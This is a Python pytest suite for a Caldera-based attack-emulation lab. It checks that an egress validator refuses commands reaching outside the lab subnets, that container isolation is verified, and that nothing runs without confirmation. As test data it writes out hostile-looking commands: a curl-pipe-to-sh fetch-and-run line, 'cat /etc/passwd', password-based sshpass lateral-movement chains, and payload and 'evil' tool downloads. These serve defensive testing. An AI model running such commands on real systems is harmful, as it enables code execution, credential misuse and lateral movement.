"""Dedicated, example-based containment security suite (task 15.1) — SECURITY CORE.

This suite is the human-legible, curated-style counterpart to the containment
*property* tests (Properties 1, 2 and 6, already covered broadly by
``test_subnet_validator_property.py``, ``test_isolation_property.py`` and
``test_operation_runner_property.py``). Where those exercise universal
correctness over generated inputs, this file pins down the security guarantees
with **concrete, named commands and explicit container configs** so a reader can
see exactly what is blocked and what is allowed.

It intentionally does NOT re-implement the property generators. It asserts, with
real curated-style commands and hand-written network configs:

- Req. 6.1, 6.2 — ANY command whose destination falls outside the three internal
  subnets (172.20.0.0/24, 172.21.0.0/24, 172.22.0.0/24) refuses the offending
  Ability and blocks the WHOLE Operation, identifying the Ability/command.
- Req. 6.3, 6.4 — a target container attached to ``local-network`` (bridge) OR
  configured with an external ``dns`` (e.g. ``8.8.8.8``) is classified NOT
  isolated and aborts the pre-flight, identifying the container.
- Req. 6.6, 6.7 — no execution occurs without explicit confirmation: with
  ``confirmado=False`` nothing runs and nothing is persisted.

Everything is driven with fixtures / mocks. NO real Caldera, NO real Docker
daemon, NO real environment.

_Requisitos: 6.1, 6.2, 6.3, 6.4, 6.6, 6.7_
"""

from __future__ import annotations

import json
import os
import tempfile
from dataclasses import dataclass, field
from pathlib import Path

import httpx
import pytest
from sqlalchemy import func, select
from sqlalchemy.orm import Session, sessionmaker

from app.core.config import Settings
from app.db.base import Base, import_models
from app.db.session import create_db_engine
from app.models.domain import AbilityResult, AuditLogEntry, Operation
from app.models.enums import OperationState
from app.services.audit.audit_logger import AuditLogger
from app.services.caldera import (
    ABILITIES_PATH,
    HEALTH_PATH,
    OPERATIONS_PATH,
    CalderaClient,
)
from app.services.containment.isolation import (
    ContainerNetworkInfo,
    ContainerNotFound,
    NetworkInfo,
    NetworkNotFound,
    verify_isolation,
)
from app.services.containment.subnet_validator import (
    DestinationClass,
    classify_destination,
    validate_abilities,
    validate_commands,
)
from app.services.containment.command_parser import parse_command
from app.services.operation.runner import OperationRunner, RunOutcome


# ===========================================================================
# Shared fixtures: duck-typed Ability and curated-style commands
# ===========================================================================


@dataclass(frozen=True)
class FakeAbility:
    """Minimal Ability accepted by containment / preview / runner.

    ``validate_abilities`` and ``preview_abilities`` read ``executors`` (a list
    of ``{name, platform, command}`` dicts); the Caldera payload builder reads
    ``ability_id`` / ``name``. Keeping this a plain object avoids any DB row
    dependency for the containment assertions.
    """

    ability_id: str
    name: str
    executors: tuple[dict[str, str], ...]


def _ability(ability_id: str, name: str, *commands: str) -> FakeAbility:
    """Build a FakeAbility from an id, a name and one or more concrete commands."""
    return FakeAbility(
        ability_id=ability_id,
        name=name,
        executors=tuple(
            {"name": "sh", "platform": "linux", "command": cmd} for cmd in commands
        ),
    )


# --- Curated-style INTERNAL commands (destinations ⊆ 172.20/21/22.0.0/24) ---
# These mirror the shape of the real curated cases (ShadowRay etc.) but every
# destination is inside the lab subnets, so containment must ALLOW them.
CMD_INTERNAL_SSH = "sshpass -p Passw0rd ssh attacker@172.21.0.20 'whoami'"
CMD_INTERNAL_SSH_OTHER = "sshpass -p Passw0rd ssh attacker@172.20.0.20 'id'"
CMD_INTERNAL_CURL = "curl -X POST -F 'cmd=whoami' http://172.21.0.20:5055/exec"
CMD_INTERNAL_WGET = "wget http://172.22.0.10/payload.sh"
CMD_LOCAL_ONLY = "cat /etc/passwd"
# Nested double-ssh, BOTH hops internal (172.21.0.20 -> 172.22.0.20): allowed.
CMD_NESTED_DOUBLE_SSH_INTERNAL = (
    "sshpass -p Passw0rd ssh attacker@172.21.0.20 "
    "'sshpass -p Passw0rd ssh attacker@172.22.0.20 \"whoami\"'"
)

# --- Curated-style EXTERNAL commands (at least one destination outside) -----
# These are the real curated-style egress patterns that MUST be refused.
CMD_EXTERNAL_WGET_NMAP = "wget https://nmap.org/dist/nmap-7.98.tgz"
CMD_EXTERNAL_CURL_PIPE_SH = "curl -sSL https://deb.debian.org/setup.sh | sh"
CMD_EXTERNAL_SSH_ATTACKER = "sshpass -p Passw0rd ssh attacker@203.0.113.5 'whoami'"
CMD_EXTERNAL_GIT_CLONE = "git clone https://github.com/evil/tool.git"
CMD_EXTERNAL_PIP = "pip install --index-url https://pypi.org/simple evilpkg"
# Nested double-ssh where the INNER hop escapes to an external host: refused.
CMD_NESTED_DOUBLE_SSH_EXTERNAL = (
    "sshpass -p Passw0rd ssh attacker@172.21.0.20 "
    "'sshpass -p Passw0rd ssh attacker@198.51.100.7 \"whoami\"'"
)


# ===========================================================================
# Part A — Destination containment (Req. 6.1, 6.2 / Property 1)
# ===========================================================================


class TestExternalDestinationBlocksOperation:
    """ANY external destination refuses the Ability and blocks the whole Operation."""

    def test_internal_only_ability_is_allowed(self) -> None:
        """An Ability whose every command is internal-only is ALLOWED.

        Validates: Requisitos 6.1, 6.2
        """
        report = validate_commands(
            [CMD_INTERNAL_SSH, CMD_INTERNAL_CURL, CMD_LOCAL_ONLY],
            ability_id="T1059-internal",
            ability_name="Command execution (internal)",
        )
        assert report.allowed is True
        assert report.refused is False
        assert report.offending_commands == []
        assert report.describe_violations() == []

    @pytest.mark.parametrize(
        "command, external_marker",
        [
            (CMD_EXTERNAL_WGET_NMAP, "nmap.org"),
            (CMD_EXTERNAL_CURL_PIPE_SH, "deb.debian.org"),
            (CMD_EXTERNAL_SSH_ATTACKER, "203.0.113.5"),
            (CMD_EXTERNAL_GIT_CLONE, "github.com"),
            (CMD_EXTERNAL_PIP, "pypi.org"),
        ],
    )
    def test_external_command_refuses_ability(
        self, command: str, external_marker: str
    ) -> None:
        """Each concrete external command refuses its Ability and names the offender.

        Validates: Requisitos 6.1, 6.2
        """
        report = validate_commands(
            [command],
            ability_id="T1105-ingress",
            ability_name="Ingress tool transfer",
        )
        assert report.refused is True
        assert report.allowed is False
        assert report.offending_commands, "the offending command must be identified"

        violations = report.describe_violations()
        assert violations, "a human-readable violation line must be produced"
        joined = " ".join(violations)
        # The message identifies BOTH the Ability and the offending command +
        # external destination (Req. 6.2).
        assert "Ingress tool transfer" in joined
        assert command in joined
        assert external_marker in joined

    def test_one_external_command_among_internal_ones_still_refuses(self) -> None:
        """A single external command among internal ones refuses the whole Ability.

        Validates: Requisitos 6.1, 6.2
        """
        report = validate_commands(
            [
                CMD_INTERNAL_SSH,
                CMD_INTERNAL_CURL,
                CMD_EXTERNAL_WGET_NMAP,  # the one offender
                CMD_LOCAL_ONLY,
            ],
            ability_id="mixed",
            ability_name="Mixed internal/external",
        )
        assert report.refused is True
        # Exactly the offending command is flagged, not the internal ones.
        offending = [cmd.command for cmd in report.offending_commands]
        assert offending == [CMD_EXTERNAL_WGET_NMAP]

    def test_apt_get_local_form_is_allowed_but_egress_form_is_refused(self) -> None:
        """`apt-get install` with no host is local (allowed); an egress pipe is refused.

        The task notes that `apt-get install -y nmap` names no destination, so it
        is a purely local command and must NOT be refused. The refusal must come
        from an actual egress destination such as the curl|sh form.

        Validates: Requisitos 6.1, 6.2
        """
        local = validate_commands(
            ["apt-get install -y nmap"],
            ability_id="T1105-apt",
            ability_name="apt-get install",
        )
        assert local.allowed is True, "apt-get with no host is a local command"

        egress = validate_commands(
            [CMD_EXTERNAL_CURL_PIPE_SH],
            ability_id="T1105-egress",
            ability_name="curl egress",
        )
        assert egress.refused is True

    def test_operation_with_any_external_ability_is_refused(self) -> None:
        """The Operation aggregate is refused if ANY Ability has an external dest.

        Validates: Requisitos 6.1, 6.2
        """
        abilities = [
            _ability("a1", "Recon (internal)", CMD_INTERNAL_CURL),
            _ability("a2", "Lateral (internal)", CMD_INTERNAL_SSH),
            _ability("a3", "Tool transfer (external)", CMD_EXTERNAL_WGET_NMAP),
        ]
        op_report = validate_abilities(abilities)

        assert op_report.refused is True
        assert op_report.allowed is False
        # Exactly the third Ability is the offender; the internal ones are clean.
        refused_ids = [r.ability_id for r in op_report.refused_abilities]
        assert refused_ids == ["a3"]

        # The aggregate violation text names the offending Ability + command.
        joined = " ".join(op_report.describe_violations())
        assert "Tool transfer (external)" in joined
        assert CMD_EXTERNAL_WGET_NMAP in joined
        assert "nmap.org" in joined

    def test_fully_internal_operation_is_allowed(self) -> None:
        """An Operation whose every Ability is internal-only is allowed.

        Validates: Requisitos 6.1, 6.2
        """
        abilities = [
            _ability("a1", "Recon", CMD_INTERNAL_CURL),
            _ability("a2", "Lateral", CMD_INTERNAL_SSH, CMD_INTERNAL_SSH_OTHER),
            _ability("a3", "Payload", CMD_INTERNAL_WGET),
            _ability("a4", "Local", CMD_LOCAL_ONLY),
        ]
        op_report = validate_abilities(abilities)
        assert op_report.allowed is True
        assert op_report.refused_abilities == []


class TestNestedDoubleSshContainment:
    """The nested double-ssh case: both hops internal -> allowed; inner escape -> refused."""

    def test_nested_double_ssh_both_internal_is_allowed(self) -> None:
        """Both hops internal (172.21.0.20 -> 172.22.0.20) is ALLOWED.

        Validates: Requisitos 6.1, 6.2
        """
        parsed = parse_command(CMD_NESTED_DOUBLE_SSH_INTERNAL)
        detected = {dest.value for dest in parsed.destinations}
        # Both nested hosts are detected by the recursive parser.
        assert "172.21.0.20" in detected
        assert "172.22.0.20" in detected

        report = validate_commands(
            [CMD_NESTED_DOUBLE_SSH_INTERNAL],
            ability_id="shadowray-lateral",
            ability_name="Nested SSH lateral movement",
        )
        assert report.allowed is True

    def test_nested_double_ssh_inner_external_is_refused(self) -> None:
        """An inner hop escaping to an external host refuses the Ability.

        Validates: Requisitos 6.1, 6.2
        """
        parsed = parse_command(CMD_NESTED_DOUBLE_SSH_EXTERNAL)
        detected = {dest.value for dest in parsed.destinations}
        assert "172.21.0.20" in detected  # outer hop internal
        assert "198.51.100.7" in detected  # inner hop external

        report = validate_commands(
            [CMD_NESTED_DOUBLE_SSH_EXTERNAL],
            ability_id="shadowray-lateral-escape",
            ability_name="Nested SSH escaping the lab",
        )
        assert report.refused is True
        joined = " ".join(report.describe_violations())
        assert "198.51.100.7" in joined


class TestDestinationClassification:
    """Direct classification of individual destinations (boundary legibility)."""

    @pytest.mark.parametrize(
        "command, value",
        [
            (CMD_INTERNAL_SSH, "172.21.0.20"),
            (CMD_INTERNAL_SSH_OTHER, "172.20.0.20"),
            (CMD_INTERNAL_WGET, "172.22.0.10"),
        ],
    )
    def test_internal_destinations_classified_internal(
        self, command: str, value: str
    ) -> None:
        """Concrete internal-subnet destinations classify as INTERNAL.

        Validates: Requisitos 6.1, 6.2
        """
        parsed = parse_command(command)
        target = next(d for d in parsed.destinations if d.value == value)
        assert classify_destination(target) is DestinationClass.INTERNAL

    @pytest.mark.parametrize(
        "command, value",
        [
            (CMD_EXTERNAL_WGET_NMAP, "nmap.org"),
            (CMD_EXTERNAL_SSH_ATTACKER, "203.0.113.5"),
            (CMD_EXTERNAL_GIT_CLONE, "github.com"),
        ],
    )
    def test_external_destinations_classified_external(
        self, command: str, value: str
    ) -> None:
        """Concrete external destinations (host or public IP) classify as EXTERNAL.

        Validates: Requisitos 6.1, 6.2
        """
        parsed = parse_command(command)
        target = next(d for d in parsed.destinations if d.value == value)
        assert classify_destination(target) is DestinationClass.EXTERNAL


# ===========================================================================
# Part B — Container isolation pre-flight (Req. 6.3, 6.4 / Property 2)
# ===========================================================================


@dataclass
class FakeInspector:
    """In-memory, read-only :class:`ContainerInspector` serving explicit configs.

    No real Docker daemon: it looks up dictionaries populated by each test.
    Unknown containers/networks raise the same lookup errors the real SDK adapter
    raises, exercising the fail-closed paths.
    """

    containers: dict[str, ContainerNetworkInfo] = field(default_factory=dict)
    networks: dict[str, NetworkInfo] = field(default_factory=dict)

    def get_container_network_info(self, container: str) -> ContainerNetworkInfo:
        try:
            return self.containers[container]
        except KeyError as exc:
            raise ContainerNotFound(container) from exc

    def get_network_info(self, network_name: str) -> NetworkInfo:
        try:
            return self.networks[network_name]
        except KeyError as exc:
            raise NetworkNotFound(network_name) from exc


# The two genuinely-internal lab networks used by the isolated fixtures.
_KALI_NGINX_NET = NetworkInfo(
    name="kali-nginx-network", internal=True, subnets=("172.21.0.0/24",)
)
_NGINX_DB_NET = NetworkInfo(
    name="nginx-db-network", internal=True, subnets=("172.22.0.0/24",)
)


def _isolated_inspector() -> FakeInspector:
    """Build an inspector where nginx and db are correctly isolated.

    Each is attached only to ``internal: true`` lab networks with no external
    DNS — the hardened target configuration from the design.
    """
    inspector = FakeInspector()
    inspector.networks["kali-nginx-network"] = _KALI_NGINX_NET
    inspector.networks["nginx-db-network"] = _NGINX_DB_NET
    inspector.containers["nginx"] = ContainerNetworkInfo(
        name="nginx",
        network_names=("kali-nginx-network", "nginx-db-network"),
        dns=(),
    )
    inspector.containers["db"] = ContainerNetworkInfo(
        name="db",
        network_names=("nginx-db-network",),
        dns=(),
    )
    return inspector


class TestContainerIsolationPreflight:
    """Bridge attachment or external DNS classifies a container NOT isolated."""

    def test_all_internal_containers_pass_preflight(self) -> None:
        """nginx + db attached only to internal networks -> pre-flight passes.

        Validates: Requisitos 6.3, 6.4
        """
        inspector = _isolated_inspector()
        result = verify_isolation(["nginx", "db"], inspector)
        assert result.passed is True
        assert result.offending == ()

    def test_container_on_local_network_bridge_aborts_preflight(self) -> None:
        """A container joined to the ``local-network`` bridge is NOT isolated.

        This is the exact leak the design records (lab containers also join a
        ``local-network`` bridge). The pre-flight must abort and identify it.

        Validates: Requisitos 6.3, 6.4
        """
        inspector = _isolated_inspector()
        # nginx additionally joins the external bridge -> not isolated.
        inspector.containers["nginx"] = ContainerNetworkInfo(
            name="nginx",
            network_names=("kali-nginx-network", "nginx-db-network", "local-network"),
            dns=(),
        )
        result = verify_isolation(["nginx", "db"], inspector)

        assert result.passed is False
        offending = {v.container for v in result.offending}
        assert offending == {"nginx"}
        nginx_verdict = next(v for v in result.offending if v.container == "nginx")
        assert nginx_verdict.reasons  # Req. 6.4: identify the failing container
        assert "local-network" in " ".join(nginx_verdict.reasons)
        assert "local-network" in nginx_verdict.external_networks
        # The 409-style summary names the containment failure.
        assert "não satisfeita" in result.summary()
        assert "nginx" in result.summary()

    def test_container_with_external_dns_aborts_preflight(self) -> None:
        """A container configured with external ``dns`` (8.8.8.8) is NOT isolated.

        Validates: Requisitos 6.3, 6.4
        """
        inspector = _isolated_inspector()
        # db declares an external resolver -> not isolated.
        inspector.containers["db"] = ContainerNetworkInfo(
            name="db",
            network_names=("nginx-db-network",),
            dns=("8.8.8.8",),
        )
        result = verify_isolation(["nginx", "db"], inspector)

        assert result.passed is False
        offending = {v.container for v in result.offending}
        assert offending == {"db"}
        db_verdict = next(v for v in result.offending if v.container == "db")
        assert "8.8.8.8" in " ".join(db_verdict.reasons)
        assert "8.8.8.8" in db_verdict.external_dns
        # nginx (still isolated) is not in the offending set.
        assert all(v.container != "nginx" for v in result.offending)

    def test_bridge_and_external_dns_together_both_reported(self) -> None:
        """A container with both the bridge and external DNS is NOT isolated.

        Validates: Requisitos 6.3, 6.4
        """
        inspector = _isolated_inspector()
        inspector.containers["nginx"] = ContainerNetworkInfo(
            name="nginx",
            network_names=("kali-nginx-network", "local-network"),
            dns=("8.8.8.8", "1.1.1.1"),
        )
        result = verify_isolation(["nginx"], inspector)

        assert result.passed is False
        verdict = result.offending[0]
        reasons_text = " ".join(verdict.reasons)
        assert "local-network" in reasons_text
        assert "8.8.8.8" in reasons_text

    def test_single_offender_blocks_the_whole_preflight(self) -> None:
        """One non-isolated container makes the WHOLE pre-flight fail.

        Validates: Requisitos 6.3, 6.4
        """
        inspector = _isolated_inspector()
        inspector.containers["db"] = ContainerNetworkInfo(
            name="db",
            network_names=("nginx-db-network", "local-network"),
            dns=(),
        )
        # nginx is fine, db is not -> overall must be False.
        result = verify_isolation(["nginx", "db"], inspector)
        assert result.passed is False
        assert {v.container for v in result.offending} == {"db"}


# ===========================================================================
# Part C — No execution without explicit confirmation (Req. 6.6, 6.7 / Property 6)
# ===========================================================================


@dataclass
class RecordingCaldera:
    """MockTransport handler recording every request; healthy on the happy path.

    On an unconfirmed request the runner must never touch Caldera, so
    ``requests`` stays empty — that is how the negative case is proven here.
    """

    requests: list[httpx.Request] = field(default_factory=list)

    def __call__(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        method = request.method.upper()
        path = request.url.path
        if method == "GET" and path == HEALTH_PATH:
            return httpx.Response(200, json={"status": "ok"})
        if method == "POST" and path == ABILITIES_PATH:
            return httpx.Response(200, json=json.loads(request.content.decode("utf-8")))
        if method == "POST" and path == OPERATIONS_PATH:
            return httpx.Response(
                200, json={"id": "op-sec", "name": "run", "state": "running"}
            )
        if method == "GET" and path == f"{OPERATIONS_PATH}/op-sec":
            return httpx.Response(
                200,
                json={
                    "id": "op-sec",
                    "state": "finished",
                    "chain": [
                        {
                            "id": "link-1",
                            "ability": {"ability_id": "a1"},
                            "command": "",
                            "status": 0,
                        }
                    ],
                },
            )
        raise AssertionError(f"unexpected request: {method} {path}")


def _isolated_verifier(containers: list[str], _inspector: object):
    """Fake isolation verifier reporting every requested container isolated."""
    from app.services.containment.isolation import ContainerIsolationVerdict, IsolationResult

    verdicts = tuple(
        ContainerIsolationVerdict(container=name, isolated=True, reasons=())
        for name in containers
    )
    return IsolationResult(passed=True, verdicts=verdicts)


@pytest.fixture()
def ephemeral_session():
    """Fresh temp-file SQLite session per test, torn down afterwards.

    A temp file (not ``:memory:``) so ``create_all`` and NOT NULL behavior match
    the dev SQLite default exactly. Row counts are therefore exact.
    """
    tmp_dir = tempfile.mkdtemp(prefix="pipeline_ui_sec_")
    db_path = Path(tmp_dir) / "sec.db"
    settings_obj = Settings(database_url=f"sqlite:///{db_path.as_posix()}")
    engine = create_db_engine(settings_obj)
    import_models()
    Base.metadata.create_all(bind=engine)
    session_factory = sessionmaker(
        bind=engine,
        autocommit=False,
        autoflush=False,
        expire_on_commit=False,
        future=True,
        class_=Session,
    )
    session = session_factory()
    try:
        yield session
    finally:
        session.close()
        engine.dispose()
        if db_path.exists():
            os.remove(db_path)
        os.rmdir(db_path.parent)


def _count(session: Session, model: type) -> int:
    return session.execute(select(func.count()).select_from(model)).scalar_one()


def _make_runner(session: Session, caldera: CalderaClient) -> OperationRunner:
    return OperationRunner(
        session=session,
        caldera=caldera,
        audit_logger=AuditLogger(session),
        isolation_verifier=_isolated_verifier,
    )


class TestNoExecutionWithoutConfirmation:
    """With ``confirmado=False`` nothing runs; with ``True`` the same request runs."""

    def test_unconfirmed_request_executes_nothing(self, ephemeral_session) -> None:
        """confirmado=False -> NOT_CONFIRMED, nothing persisted, Caldera untouched.

        Validates: Requisitos 6.6, 6.7
        """
        session = ephemeral_session
        recorder = RecordingCaldera()
        caldera = CalderaClient(transport=httpx.MockTransport(recorder))
        try:
            runner = _make_runner(session, caldera)
            abilities = [
                _ability("a1", "Recon", CMD_INTERNAL_CURL),
                _ability("a2", "Lateral", CMD_INTERNAL_SSH),
            ]

            result = runner.run(
                caso_id="shadowray",
                abilities=abilities,
                adversary_id="adv-1",
                confirmado=False,
                target_containers=["nginx", "db"],
            )

            assert result.outcome is RunOutcome.NOT_CONFIRMED
            assert result.state is OperationState.NOT_STARTED
            assert result.started is False
            assert result.operation_id is None

            # Nothing observable happened in any of the three tables.
            assert _count(session, Operation) == 0
            assert _count(session, AbilityResult) == 0
            assert _count(session, AuditLogEntry) == 0

            # Caldera was never touched: no adversary command executed.
            assert recorder.requests == []
        finally:
            caldera.close()

    def test_cancelled_request_via_none_executes_nothing(
        self, ephemeral_session
    ) -> None:
        """A cancelled/absent confirmation (None) also executes nothing.

        The runner requires ``confirmado is True`` exactly, so a ``None``
        (absent-intent / cancellation) must be treated as not confirmed.

        Validates: Requisitos 6.6, 6.7
        """
        session = ephemeral_session
        recorder = RecordingCaldera()
        caldera = CalderaClient(transport=httpx.MockTransport(recorder))
        try:
            runner = _make_runner(session, caldera)
            result = runner.run(
                caso_id="apt41_dust",
                abilities=[_ability("a1", "Recon", CMD_INTERNAL_CURL)],
                adversary_id="adv-2",
                confirmado=None,  # type: ignore[arg-type]
                target_containers=["nginx"],
            )
            assert result.outcome is RunOutcome.NOT_CONFIRMED
            assert result.state is OperationState.NOT_STARTED
            assert _count(session, Operation) == 0
            assert recorder.requests == []
        finally:
            caldera.close()

    def test_explicit_confirmation_runs_the_operation(
        self, ephemeral_session
    ) -> None:
        """confirmado=True (all other gates open) starts and runs the Operation.

        This proves the gate that blocked the negative cases is *confirmation
        itself*, not an unrelated pre-flight refusal.

        Validates: Requisitos 6.6, 6.7
        """
        session = ephemeral_session
        recorder = RecordingCaldera()
        caldera = CalderaClient(transport=httpx.MockTransport(recorder))
        try:
            runner = _make_runner(session, caldera)
            result = runner.run(
                caso_id="shadowray",
                abilities=[_ability("a1", "Recon", CMD_INTERNAL_CURL)],
                adversary_id="adv-3",
                confirmado=True,
                target_containers=["nginx", "db"],
            )
            assert result.outcome is RunOutcome.COMPLETED
            assert result.state is OperationState.FINISHED
            assert result.started is True
            assert _count(session, Operation) == 1
            # Caldera WAS exercised on the confirmed path (contrast negative case).
            assert recorder.requests != []
        finally:
            caldera.close()
